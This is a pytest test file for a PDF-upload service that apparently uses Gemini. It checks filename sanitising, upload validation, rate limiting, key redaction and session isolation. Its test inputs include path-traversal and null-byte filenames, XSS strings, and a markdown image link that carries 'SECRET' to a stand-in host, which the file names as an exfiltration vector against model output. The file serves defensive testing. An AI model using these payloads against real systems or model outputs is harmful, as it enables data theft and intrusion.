import pytest

from src.llm_service import GeminiService, LLMAuthError, LLMRateLimitError, LLMUnavailableError
from src.security import (
    RateLimitExceeded,
    SlidingWindowLimiter,
    ValidationError,
    is_valid_document_id,
    is_valid_session_id,
    new_document_id,
    new_session_id,
    redact,
    sanitize_filename,
    sanitize_model_markdown,
    validate_pdf_upload,
)
from tests.conftest import PHOTO_TEXT, make_pdf


# ---------------------------------------------------------------- security helpers
@pytest.mark.parametrize(
    "raw,expected",
    [
        ("../../etc/passwd", "passwd.pdf"),
        ("C:\\Users\\bob\\report.pdf", "report.pdf"),
        ("my report (final).PDF", "my report (final).pdf"),
        ("evil\x00name.pdf", "evilname.pdf"),
        ("", "document.pdf"),
        ("..", "document.pdf"),
        # the "/" in "</script>" is treated as a path separator, so only the last part survives
        ("<script>alert(1)</script>.pdf", "script_.pdf"),
    ],
)
def test_sanitize_filename(raw, expected):
    assert sanitize_filename(raw) == expected


def test_sanitize_filename_has_no_path_separators_and_is_bounded():
    out = sanitize_filename("a/b\\c/" + "x" * 500 + ".pdf")
    assert "/" not in out and "\\" not in out and len(out) <= 80


def test_ids_are_random_and_validated():
    ids = {new_session_id() for _ in range(50)}
    assert len(ids) == 50 and all(is_valid_session_id(i) for i in ids)
    assert is_valid_document_id(new_document_id())
    assert not is_valid_session_id("../x") and not is_valid_session_id("s123")


def test_upload_validation():
    with pytest.raises(ValidationError):
        validate_pdf_upload(b"", 1000)
    with pytest.raises(ValidationError):
        validate_pdf_upload(b"%PDF-" + b"0" * 2000, 1000)
    with pytest.raises(ValidationError):
        validate_pdf_upload(b"MZ\x90\x00 not a pdf", 1000)
    validate_pdf_upload(b"%PDF-1.7\n...", 1000)


def test_rate_limiter_window():
    now = [0.0]
    lim = SlidingWindowLimiter(2, 10, clock=lambda: now[0])
    lim.check("a"); lim.check("a")
    with pytest.raises(RateLimitExceeded) as exc:
        lim.check("a")
    assert exc.value.retry_after_seconds >= 1
    lim.check("b")  # separate key
    now[0] = 11.0
    lim.check("a")  # window slid


def test_redact_removes_key_shapes():
    out = redact("error with key=AIzaSyA1234567890abcdefghijklmnopqrstuv and api_key: hunter2")
    assert "AIza" not in out and "hunter2" not in out


def test_sanitize_model_markdown_blocks_exfiltration_vectors():
    text = "Look ![x](https://evil.test/p.png?d=SECRET) and [click](https://evil.test/?q=1) $5 <img src=x onerror=1> https://a.test/z"
    out = sanitize_model_markdown(text)
    assert "![" not in out and "](" not in out and "<img" not in out
    assert "https://" not in out and "\\$5" in out


# ---------------------------------------------------------------- LLM error mapping
class _E:
    def __init__(self, code):
        self.code = code


@pytest.mark.parametrize(
    "code,exc_type",
    [(429, LLMRateLimitError), (401, LLMAuthError), (403, LLMAuthError), (404, LLMUnavailableError), (503, LLMUnavailableError)],
)
def test_gemini_error_mapping(code, exc_type):
    assert isinstance(GeminiService._map_api_error(_E(code)), exc_type)


def test_error_messages_never_contain_key(settings):
    msg = str(GeminiService._map_api_error(_E(401)))
    assert settings.gemini_api_key not in msg


# ---------------------------------------------------------------- document manager
def test_successful_ingest_reports_pages_and_chunks(services, session_id, science_pdf):
    out = services.manager.add_document(session_id, "../science.pdf", science_pdf)
    assert out.ok and out.filename == "science.pdf"
    assert out.record.pages == 2 and out.record.chunks >= 2
    assert services.manager.list_documents(session_id)[0].status == "ready"


def test_duplicate_upload_detected(services, session_id, science_pdf):
    assert services.manager.add_document(session_id, "a.pdf", science_pdf).ok
    dup = services.manager.add_document(session_id, "renamed.pdf", science_pdf)
    assert not dup.ok and "already uploaded" in dup.message
    assert len(services.manager.list_documents(session_id)) == 1


def test_same_file_allowed_in_different_sessions(services, science_pdf):
    assert services.manager.add_document(new_session_id(), "a.pdf", science_pdf).ok
    assert services.manager.add_document(new_session_id(), "a.pdf", science_pdf).ok


def test_file_count_limit(settings, services, session_id):
    services.manager.settings = settings.with_overrides(max_files_per_session=2)
    for i in range(2):
        assert services.manager.add_document(session_id, f"{i}.pdf", make_pdf([PHOTO_TEXT + f" variant {i} unique words"])).ok
    out = services.manager.add_document(session_id, "3.pdf", make_pdf([PHOTO_TEXT + " third"]))
    assert not out.ok and "at most 2" in out.message


def test_size_limit(settings, services, session_id, science_pdf):
    services.manager.settings = settings.with_overrides(max_upload_mb=0)
    out = services.manager.add_document(session_id, "big.pdf", science_pdf)
    assert not out.ok and "limit" in out.message


@pytest.mark.parametrize(
    "data,fragment",
    [
        (b"", "empty"),
        (b"not a pdf at all", "PDF"),
        (b"%PDF-1.7 garbage garbage garbage", "could not be opened"),
        (make_pdf(["", ""]), "OCR"),
        (make_pdf([PHOTO_TEXT], password="pw"), "password"),
    ],
)
def test_bad_files_give_friendly_failures(services, session_id, data, fragment):
    out = services.manager.add_document(session_id, "bad.pdf", data)
    assert not out.ok and fragment.lower() in out.message.lower()
    assert services.manager.list_documents(session_id) == []
    assert services.store.count(session_id) == 0


def test_remove_document_deletes_vectors_only_for_that_doc(services, session_id, science_pdf, history_pdf):
    a = services.manager.add_document(session_id, "a.pdf", science_pdf).record
    b = services.manager.add_document(session_id, "b.pdf", history_pdf).record
    before = services.store.count(session_id)
    assert services.manager.remove_document(session_id, a.doc_id)
    assert services.store.count(session_id) == before - a.chunks
    assert {c.doc_id for c in services.store.all_chunks(session_id)} == {b.doc_id}
    assert not services.manager.remove_document(session_id, a.doc_id)


def test_cannot_remove_another_sessions_document(services, science_pdf):
    s1, s2 = new_session_id(), new_session_id()
    rec = services.manager.add_document(s1, "a.pdf", science_pdf).record
    assert not services.manager.remove_document(s2, rec.doc_id)
    assert services.store.count(s1) == rec.chunks


def test_clear_session_removes_everything(services, session_id, science_pdf):
    services.manager.add_document(session_id, "a.pdf", science_pdf)
    services.manager.clear_session(session_id)
    assert services.store.count(session_id) == 0
    assert services.manager.list_documents(session_id) == []


def test_idle_sessions_are_purged(settings, services, science_pdf):
    now = [0.0]
    services.manager._clock = lambda: now[0]
    old, fresh = new_session_id(), new_session_id()
    services.manager.add_document(old, "a.pdf", science_pdf)
    now[0] = settings.session_idle_minutes * 60 - 1
    services.manager.add_document(fresh, "a.pdf", science_pdf)
    now[0] = settings.session_idle_minutes * 60 + 10
    assert services.manager.purge_idle_sessions() == 1
    assert services.store.count(old) == 0 and services.store.count(fresh) > 0


def test_invalid_session_id_rejected(services, science_pdf):
    out = services.manager.add_document("../../bad", "a.pdf", science_pdf)
    assert not out.ok
